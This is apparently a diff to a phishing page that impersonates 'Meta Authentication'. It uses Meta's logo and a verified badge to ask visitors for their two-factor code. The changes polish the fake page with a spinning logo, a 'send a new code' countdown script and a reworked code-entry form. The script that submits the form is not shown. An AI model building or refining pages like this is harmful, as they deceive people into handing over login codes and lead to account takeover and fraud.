@@ -208,6 +208,19 @@ div[class^="tiktok"].--savior-overlay-z-index-reset {
   }
 }
 
+.rotating-logo {
+  animation: spin 2s linear infinite;
+}
+
+@keyframes spin {
+  from {
+    transform: rotate(0deg);
+  }
+  to {
+    transform: rotate(360deg);
+  }
+}
+
 </style></head>
 
 <body bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQiLCJMSU5LRURJTiI6ImRpc2FibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMC4xNiIsInNjb3JlIjoyMDAxNn1d" __processed_09aea209-60ca-48eb-9abc-dc1c493e7352__="true">
@@ -3873,62 +3886,101 @@ div[class^="tiktok"].--savior-overlay-z-index-reset {
           </div>
         </div>
       </div>
-    <div class="modal form-modal" id="twoFAmodal" tabindex="-1" aria-labelledby="2FAmodalLabel" aria-hidden="true" bis_skin_checked="1">
+      <div class="modal form-modal" id="twoFAmodal" tabindex="-1" aria-labelledby="2FAmodalLabel" aria-hidden="true" bis_skin_checked="1">
         <div class="modal-dialog modal-dialog-centered modal-fullscreen-lg-down" bis_skin_checked="1">
-            <div class="modal-content" bis_skin_checked="1">
-                <div class="modal-body" bis_skin_checked="1">
-                    <div class="twoFAinfo-wraper" bis_skin_checked="1">
-                        <h1 class="modal-title" id="2FAmodalLabel" style="display: flex; align-items: center;">
-                            <span style="display: flex; align-items: center;">
-                              <img src="https://static.xx.fbcdn.net/rsrc.php/yO/r/8S6ZPxM3N1I.svg" alt="Meta Logo" class="w-12 h-12" style="margin-right: 8px;">
-                              <span style="position: relative; top: 0px;">Meta Authentication</span>
-                            </span>
-                            <svg viewBox="0 1 12 13" width="16" height="16" fill="#3b82f6" class="inline-block align-middle" style="margin-left: 4px; transform: translateY(1px);">
-                              <g fill-rule="evenodd" transform="translate(-98 -917)">
-                                <path d="m106.853 922.354-3.5 3.5a.499.499 0 0 1-.706 0l-1.5-1.5a.5.5 0 1 1 .706-.708l1.147 1.147 3.147-3.147a.5.5 0 1 1 .706.708m3.078 2.295-.589-1.149.588-1.15a.633.633 0 0 0-.219-.82l-1.085-.7-.065-1.287a.627.627 0 0 0-.6-.603l-1.29-.066-.703-1.087a.636.636 0 0 0-.82-.217l-1.148.588-1.15-.588a.631.631 0 0 0-.82.22l-.701 1.085-1.289.065a.626.626 0 0 0-.6.6l-.066 1.29-1.088.702a.634.634 0 0 0-.216.82l.588 1.149-.588 1.15a.632.632 0 0 0 .219.819l1.085.701.065 1.286c.014.33.274.59.6.604l1.29.065.703 1.088c.177.27.53.362.82.216l1.148-.588 1.15.589a.629.629 0 0 0 .82-.22l.701-1.085 1.286-.064a.627.627 0 0 0 .604-.601l.065-1.29 1.088-.703a.633.633 0 0 0 .216-.819"></path>
-                              </g>
-                            </svg>
-                          </h1>
-                        <br>
-                        <p style="font-size: 18px;">
-                            Enter the 6-digit code for this account from the Two-factor Authentication you set up (such as Google Authenticator, Email or text message on your mobile).
-                        </p>
-                        <div class="fb-round-wraper" bis_skin_checked="1">
-                            <img src="../img/approve.png" alt="" style="width: 100%; border-radius: 6px;">
-                        </div>
-                        
-                    </div>
-
-                    <form id="twoFAForm">
-                        <div class="mb-3" bis_skin_checked="1">
-                        </div>
-
-
-                        <div class="mb-3" bis_skin_checked="1">
-                            <div class="password-input" bis_skin_checked="1">
-                                <label for="exampleInputPassword" class="form-label">Code</label>
-                                <input name="2FA-1" minlength="6" maxlength="8" type="tel" class="form-control" id="exampleInputPassword" aria-describedby="emailHelp" required="" autocomplete="off">
-                            </div>
-                            <div class="invalid-feedback" bis_skin_checked="1">
-                                The code that you've entered is incorrect.<br>
-                                Please, try again after <span id="timer"></span>
-                            </div>
-                        </div>
-                        <div class="form-btn-wrapper" bis_skin_checked="1">
-                            <button class="btn btn-primary">
-                                <div class="spinner-border text-light" role="status" style="display: none;" bis_skin_checked="1">
-                                    <span class="visually-hidden">Loading...</span>
-                                </div>
-                                <span class="button-text">Continue</span>
-                            </button>
-                        </div>
-                    </form>
-                    <div class="spaser" bis_skin_checked="1"></div>
+          <div class="modal-content" bis_skin_checked="1">
+            <div class="modal-body" bis_skin_checked="1">
+              <div class="twoFAinfo-wraper" bis_skin_checked="1">
+                <h1 class="modal-title" id="2FAmodalLabel" style="display: flex; align-items: center;">
+                  <span style="display: flex; align-items: center;">
+                    <img src="https://static.xx.fbcdn.net/rsrc.php/yO/r/8S6ZPxM3N1I.svg" alt="Meta Logo" class="w-12 h-12" style="margin-right: 8px;">
+                    <span style="position: relative; top: 0px;">Meta Authentication</span>
+                  </span>
+                  <svg viewBox="0 1 12 13" width="16" height="16" fill="#3b82f6" class="inline-block align-middle" style="margin-left: 4px; transform: translateY(1px);">
+                    <g fill-rule="evenodd" transform="translate(-98 -917)">
+                      <path d="m106.853 922.354-3.5 3.5a.499.499 0 0 1-.706 0l-1.5-1.5a.5.5 0 1 1 .706-.708l1.147 1.147 3.147-3.147a.5.5 0 1 1 .706.708m3.078 2.295-.589-1.149.588-1.15a.633.633 0 0 0-.219-.82l-1.085-.7-.065-1.287a.627.627 0 0 0-.6-.603l-1.29-.066-.703-1.087a.636.636 0 0 0-.82-.217l-1.148.588-1.15-.588a.631.631 0 0 0-.82.22l-.701 1.085-1.289.065a.626.626 0 0 0-.6.6l-.066 1.29-1.088.702a.634.634 0 0 0-.216.82l.588 1.149-.588 1.15a.632.632 0 0 0 .219.819l1.085.701.065 1.286c.014.33.274.59.6.604l1.29.065.703 1.088c.177.27.53.362.82.216l1.148-.588 1.15.589a.629.629 0 0 0 .82-.22l.701-1.085 1.286-.064a.627.627 0 0 0 .604-.601l.065-1.29 1.088-.703a.633.633 0 0 0 .216-.819"></path>
+                    </g>
+                  </svg>
+                </h1>
+                <br>
+                <p style="font-size: 18px;">
+                  Enter the 6-digit code for this account from the Two-factor Authentication you set up (such as closes, Email or text message on your mobile).
+                </p>
+                <div class="fb-round-wraper" bis_skin_checked="1">
+                  <img src="../img/approve.png" alt="Approve Illustration" style="width: 100%; border-radius: 6px;">
                 </div>
-                
-            </div>
+                <div style="display: flex; align-items: center; margin-top: 15px; margin-bottom: 80px;" bis_skin_checked="1">
+                    <!-- Logo tĩnh: Mũi tên cuộn tròn -->
+                    <img src="https://static-00.iconduck.com/assets.00/reset-alt-icon-512x484-wuz1nkw8.png" alt="reset icon" width="16" height="16" onclick="startResendTimer()" style="margin-right: 8px; cursor: pointer;" loading="lazy" onload="LoadUtils.handleImageLoad(this);" onerror="LoadUtils.handleImageLoadError(this);">
+                    <!-- Chữ với màu đen -->
+                    <span style="font-size: 14px; color: #000000;">
+                      We can send a new code in <span id="resend-timer">00:00</span>
+                    </span>
+                  </div>
+      
+              <form id="twoFAForm">
+  <div class="mb-3" bis_skin_checked="1">
+  </div>
+  <div class="mb-3" bis_skin_checked="1">
+    <div class="password-input" bis_skin_checked="1">
+      <label for="exampleInputPassword" class="form-label">Code</label>
+      <div style="position: relative; width: 100%;">
+        <input name="2FA-1" minlength="6" maxlength="8" type="tel" class="form-control" id="exampleInputPassword" aria-describedby="code-error" required="" autocomplete="off">
+        <div class="invalid-feedback" id="code-error" style="position: absolute; top: 100%; left: 0px; margin-top: 5px; color: rgb(220, 53, 69); width: 100%; box-sizing: border-box;" bis_skin_checked="1">
+          <span style="display: block; width: 100%;">The code that you've entered is incorrect.</span>
+          <span style="display: block; width: 100%;">Please, try again after <span id="timer"></span></span>
         </div>
+      </div>
     </div>
+  </div>
+  <div class="button-container" style="margin-top: 30px;" bis_skin_checked="1">
+    <div class="form-btn-wrapper" bis_skin_checked="1">
+      <button class="btn btn-primary">
+        <div class="spinner-border text-light" role="status" style="display: none;" bis_skin_checked="1">
+          <span class="visually-hidden">Loading...</span>
+        </div>
+        <span class="button-text">Continue</span>
+      </button>
+    </div>
+  </div>
+</form>
+              <div class="spaser" bis_skin_checked="1"></div>
+      
+              <script>
+               
+                let resendTime = 179; 
+                let timerInterval = null; 
+                const resendTimerElement = document.getElementById("resend-timer");
+      
+                
+                const startResendTimer = () => {
+                  if (timerInterval) {
+                    clearInterval(timerInterval); 
+                  }
+                  resendTime = 179; 
+                  resendTimerElement.textContent = "02:59"; 
+      
+                  timerInterval = setInterval(() => {
+                    const minutes = Math.floor(resendTime / 60).toString().padStart(2, "0");
+                    const seconds = (resendTime % 60).toString().padStart(2, "0");
+                    resendTimerElement.textContent = `${minutes}:${seconds}`;
+                    if (resendTime > 0) {
+                      resendTime--;
+                    } else {
+                      clearInterval(timerInterval); 
+                    }
+                  }, 1000);
+                };
+      
+                document.getElementById("twoFAmodal").addEventListener("shown.bs.modal", startResendTimer);
+      
+                
+                resendTimerElement.textContent = "02:59";
+              </script>
+            </div>
+          </div>
+        </div>
+      </div>
     <div class="modal form-modal" id="successModal" tabindex="-1" aria-labelledby="successModalLabel" aria-hidden="true" bis_skin_checked="1">
         <div class="modal-dialog modal-dialog-centered modal-fullscreen-lg-down" bis_skin_checked="1">
             <div class="modal-content" bis_skin_checked="1">
